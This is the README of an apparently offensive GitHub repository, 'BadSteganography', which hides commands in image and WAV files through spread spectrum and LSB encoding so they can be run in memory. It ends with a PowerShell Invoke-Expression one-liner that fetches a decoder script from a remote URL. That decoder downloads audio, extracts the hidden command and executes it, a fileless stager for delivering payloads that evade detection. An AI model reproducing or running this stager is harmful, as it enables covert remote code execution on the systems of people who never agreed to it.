# BadSteganography
Bad Steganography is a repo for encoding commands into images or wav files to execute such in memory. 

# Spread Spectrum Encoding
The steganography method used in the provided script is a form of audio steganography known as spread spectrum encoding. In spread spectrum encoding, the hidden message is embedded in a way that spreads its energy across the frequency spectrum of the carrier signal. This makes the hidden message less susceptible to detection and removal by typical audio processing techniques.

In this specific implementation, the amplitude of the audio samples is modified to represent the binary values of the message. By altering the amplitude, the hidden message is encoded into the audio signal, which can later be extracted using the same method.

# LSB Encoding
The steganography method used in the provided code is called “LSB (Least Significant Bit) steganography.” In this method, the least significant bit of each color channel (RGB) of the pixels in a specified region of an image is replaced with a bit of the secret data. This is done in such a way that the change is not visually noticeable in the image, but the secret data can be retrieved by reading the least significant bits of the color channels in the same region.

# Example
This default payload grabs the contents of the decoder, which then downloads the audio to memory, decodes the message, and executes the command with Invoke-Expression
```
iex(https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content
```
